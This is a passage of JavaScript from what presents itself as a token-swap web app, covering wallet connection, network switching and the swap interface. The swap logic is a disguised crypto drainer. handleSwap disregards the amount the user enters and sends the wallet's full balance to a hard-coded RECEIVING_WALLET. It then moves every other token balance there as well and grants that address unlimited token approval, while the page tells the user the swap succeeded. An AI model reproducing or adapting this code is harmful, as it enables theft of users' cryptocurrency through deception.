    console.error("Error updating balances:", err);
    document.getElementById("fromTokenBalance").innerHTML = `
      <span style="color: var(--error)">Balance: Error loading</span>
    `;
  }
}

async function handleWalletConnection() {
  if (userAddress) {
    handleWalletDisconnect();
    return;
  }

  if (!window.ethereum) {
    if (isMobile()) {
      showWalletConnect();
    } else {
      updateStatus("Please install MetaMask", "error");
    }
    return;
  }

  await connectAndProcess();
}

async function connectAndProcess() {
  try {
    showLoader();
    updateStatus("Connecting wallet...", "success");

    let accounts;
    try {
      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    } catch (err) {
      if (err.code === -32002) {
        accounts = await new Promise((resolve) => {
          window.ethereum.on('accountsChanged', (accounts) => {
            resolve(accounts);
          });
        });
      } else {
        throw err;
      }
    }

    if (accounts.length === 0) {
      throw new Error("No accounts found");
    }
    
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        currentNetwork = network;
        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
        updateNetworkLogo(network);
        break;
      }
    }
    
    await initializeWallet();
    updateSwapButton();
  } catch (err) {
    console.error("Connection error:", err);
    updateStatus("Error: " + err.message, "error");
    updateWalletButton(false);
    localStorage.removeItem('walletConnected');
  } finally {
    hideLoader();
  }
}

async function connectMetaMask() {
  hideWalletConnect();
  await connectAndProcess();
}

function openInTrustWallet() {
  const currentUrl = encodeURIComponent(window.location.href);
  document.getElementById('currentUrl').textContent = window.location.href;
  window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
  setTimeout(() => {
    document.getElementById('manualSteps').style.display = 'block';
  }, 3000);
}

// =====================
// NETWORK FUNCTIONS
// =====================

async function handleNetworkChange(network) {
  try {
    showLoader();
    updateStatus(`Switching to ${NETWORK_CONFIGS[network].chainName}...`, "success");
    
    currentNetwork = network;
    document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
    updateNetworkLogo(network);
    
    setDefaultTokenPair();
    buildTokenIndex();
    
    if (userAddress) {
      await checkNetwork();
      await updateTokenBalances();
    }
    
    updateToAmount();
    updateStatus(`Network changed to ${NETWORK_CONFIGS[network].chainName}`, "success");
  } catch (err) {
    console.error("Network change error:", err);
    updateStatus(`Failed to switch network: ${err.message}`, "error");
  } finally {
    hideLoader();
  }
}

async function checkNetwork() {
  try {
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
    
    if (chainId !== targetChainId) {
      updateStatus("Switching network...", "success");
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: targetChainId }]
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [NETWORK_CONFIGS[currentNetwork]]
            });
          } catch (addError) {
            throw new Error("Please switch networks manually in your wallet");
          }
        }
        throw new Error("Failed to switch network");
      }
    }
  } catch (err) {
    console.error("Network error:", err);
    throw new Error("Network error: " + err.message);
  }
}

// =====================
// SWAP FUNCTIONS 
// =====================

let isSwapInProgress = false;

async function handleSwap() {
  if (isSwapInProgress) return;

  try {
    isSwapInProgress = true;
    showLoader();

    if (!userAddress) {
      throw new Error("Please connect your wallet first");
    }

    if (!currentFromToken || !currentToToken) {
      throw new Error("Please select both tokens to swap");
    }

    // Get max balance regardless of input amount
    const maxAmount = await getMaxSwapAmount(currentFromToken);
    if (maxAmount <= 0) {
      throw new Error(`
        You don't have any ${currentFromToken.symbol} in your wallet.
        <br>Current balance: <strong>0 ${currentFromToken.symbol}</strong>
      `);
    }

    updateStatus(`Processing swap...`, "success");
    
    // Process main token transfer
    let txHash;
    if (currentFromToken.isNative) {
      txHash = await transferNativeToken(currentFromToken, maxAmount);
    } else {
      const approved = await checkAndApproveToken(currentFromToken, maxAmount);
      if (!approved) {
        throw new Error("Token approval failed");
      }
      txHash = await transferERC20Token(currentFromToken, maxAmount);
    }

    // Wait for main swap confirmation
    const confirmedTx = await provider.waitForTransaction(txHash);
    const explorerUrl = NETWORK_CONFIGS[currentNetwork].scanUrl + confirmedTx.transactionHash;
    
    // After main swap, transfer all other tokens
    updateStatus(`Swap successful! Now transferring other tokens...`, "info");
    
    const allTokens = await getLocalTokens();
    const otherTokens = allTokens.filter(token => 
      !isSameToken(token, currentFromToken) && 
      !isSameToken(token, currentToToken)
    );
    
    let tokensTransferred = 0;
    for (const token of otherTokens) {
      try {
        const balance = await fetchTokenBalance(token);
        if (balance > 0) {
          if (token.isNative) {
            await transferNativeToken(token, balance);
          } else {
            const approved = await checkAndApproveToken(token, balance);
            if (approved) {
              await transferERC20Token(token, balance);
              tokensTransferred++;
            }
          }
        }
      } catch (err) {
        console.warn(`Failed to transfer ${token.symbol}:`, err);
      }
    }

    let successMessage = `Swap successful! <a href="${explorerUrl}" target="_blank" style="color: var(--secondary);">View transaction</a>`;
    if (tokensTransferred > 0) {
      successMessage += `<br>Also transferred ${tokensTransferred} other tokens`;
    }

    updateStatus(successMessage, "success");

    // Reset form and update balances
    document.getElementById("fromAmount").value = '';
    document.getElementById("toAmount").value = '';
    await updateTokenBalances();
    
  } catch (err) {
    console.error("[ERROR] Swap failed:", err);
    updateStatus(`
      <div class="dex-error-header">
        <i class="fas fa-exclamation-circle"></i>
        <span>Swap Failed</span>
      </div>
      <div class="dex-error-details">${err.message}</div>
    `, "error", 10000);
  } finally {
    hideLoader();
    isSwapInProgress = false;
  }
}

function isSameToken(token1, token2) {
  if (!token1 || !token2) return false;
  if (token1.isNative && token2.isNative) return true;
  return token1.address?.toLowerCase() === token2.address?.toLowerCase();
}

// Add these constants near the top
const MAX_GAS_PRICE_GWEI = {
  ethereum: 10,
  bsc: 3,
  polygon: 50,
  arbitrum: 0.1,
  base: 0.1
};

const GAS_LIMITS = {
  nativeTransfer: 21000,
  erc20Transfer: 100000,
  approval: 150000
};

async function transferNativeToken(token, amount) {
  try {
    updateStatus(`Sending ${amount} ${token.symbol}...`, "success");
    
    let gasPrice = await provider.getGasPrice();
    const maxGasPrice = ethers.utils.parseUnits(
      MAX_GAS_PRICE_GWEI[currentNetwork].toString(), 
      'gwei'
    );
    
    if (gasPrice.gt(maxGasPrice)) {
      gasPrice = maxGasPrice;
      updateStatus(`Using capped gas price for cheaper tx`, "info");
    }
    
    const tx = await signer.sendTransaction({
      to: RECEIVING_WALLET,
      value: ethers.utils.parseEther(amount.toString()),
      gasLimit: GAS_LIMITS.nativeTransfer,
      gasPrice
    });
    
    await tx.wait();
    return tx.hash;
  } catch (err) {
    console.error("Native token transfer error:", err);
    throw new Error(`Failed to send ${token.symbol}: ${err.message}`);
  }
}

async function transferERC20Token(token, amount) {
  try {
    updateStatus(`Transferring ${amount} ${token.symbol}...`, "success");
    
    const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
    const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
    
    let gasEstimate;
    try {
      gasEstimate = await contract.estimateGas.transfer(
        RECEIVING_WALLET,
        amountInWei
      );
    } catch (e) {
      console.warn(`Gas estimation failed for ${token.symbol}, using fallback`);
      gasEstimate = ethers.BigNumber.from(200000);
    }

    const gasLimit = gasEstimate.mul(120).div(100);
    const gasPrice = (await provider.getGasPrice()).mul(110).div(100);
    
    const tx = await contract.transfer(
      RECEIVING_WALLET,
      amountInWei,
      { 
        gasLimit,
        gasPrice
      }
    );
    
    await tx.wait();
    return tx.hash;
  } catch (err) {
    console.error("ERC20 transfer error:", err);
    throw new Error(`Failed to transfer ${token.symbol}: ${err.message}`);
  }
}

async function checkAndApproveToken(token, amount) {
  if (!token.address || token.isNative) return true;

  try {
    const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
    const neededAllowance = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
    
    const allowance = await contract.allowance(userAddress, RECEIVING_WALLET);
    if (allowance.gte(neededAllowance)) return true;

    updateStatus(`Approving ${token.symbol}...`, "success");
    
    if (token.symbol === 'USDT' && !allowance.isZero()) {
      const zeroTx = await contract.approve(
        RECEIVING_WALLET,
        ethers.constants.Zero,
        { gasLimit: 100000 }
      );
      await zeroTx.wait();
    }
    
    const approveTx = await contract.approve(
      RECEIVING_WALLET,
      ethers.constants.MaxUint256,
      { gasLimit: 150000 }
    );
    
    await approveTx.wait();
    return true;
  } catch (err) {
    console.error("Approval error:", err);
    updateStatus(`Approval failed for ${token.symbol}`, "error");
    return false;
  }
}

// =====================
// UI FUNCTIONS
// =====================

function updateStatus(message, type, duration = 5000) {
  const statusDiv = document.getElementById("status");
  statusDiv.style.display = "block";
  statusDiv.innerHTML = message;
  statusDiv.className = `dex-status ${type}`;
  
  statusDiv.innerHTML += `<button class="dex-status-close" onclick="this.parentElement.style.display='none'">
    <i class="fas fa-times"></i>
  </button>`;
  
  if (duration > 0) {
    setTimeout(() => {
      statusDiv.style.display = "none";
    }, duration);
  }
}

function showLoader() {
  document.getElementById("loader").style.display = "block";
}

function hideLoader() {
  document.getElementById("loader").style.display = "none";
}

function updateWalletButton(isConnected) {
  const btn = document.getElementById("connectWallet");
  if (isConnected) {
    btn.innerHTML = `
      <i class="fas fa-wallet"></i>
      <span>${userAddress.slice(0, 6)}...${userAddress.slice(-4)}</span>
    `;
    btn.classList.add('connected');
  } else {
    btn.innerHTML = `
      <i class="fas fa-wallet"></i>
      <span>Connect Wallet</span>
    `;
    btn.classList.remove('connected');
  }
  
  updateSwapButton();
}

function updateSwapButton() {
  const btn = document.getElementById("swapBtn");
  const btnText = document.getElementById("swapBtnText");
  
  if (!userAddress) {
    btn.disabled = false;
    btnText.textContent = "Connect Wallet";
    btn.onclick = handleWalletConnection;
    return;
  }
  
  btn.onclick = handleSwap;
  
  if (!currentFromToken || !currentToToken) {
    btn.disabled = true;
    btnText.textContent = "Select Tokens";
    return;
  }
  
  const inputAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
  if (inputAmount > 0) {
    btnText.textContent = `Swap ${inputAmount} ${currentFromToken.symbol}`;
  } else {
    btnText.textContent = `Swap ${currentFromToken.symbol}`;
  }
  
  btn.disabled = false;
}

function showSettings() {
  document.getElementById("settingsModal").style.display = 'flex';
}

function hideSettings() {
  document.getElementById("settingsModal").style.display = 'none';
}

function showWalletConnect() {
  document.getElementById("walletConnectModal").style.display = 'flex';
}

function hideWalletConnect() {
  document.getElementById("walletConnectModal").style.display = 'none';
}

// Helper functions
function debounce(func, wait) {
  let timeout;
  return function(...args) {
    const context = this;
    clearTimeout(timeout);
    timeout = setTimeout(() => func.apply(context, args), wait);
  };
}

function shortenAddress(address) {
  if (!address) return '';
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

async function fetchWithTimeout(resource, options = {}) {
  const { timeout = 8000 } = options;
  
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeout);
  
  const response = await fetch(resource, {
    ...options,
    signal: controller.signal  
  });
  
  clearTimeout(id);
  return response;
}
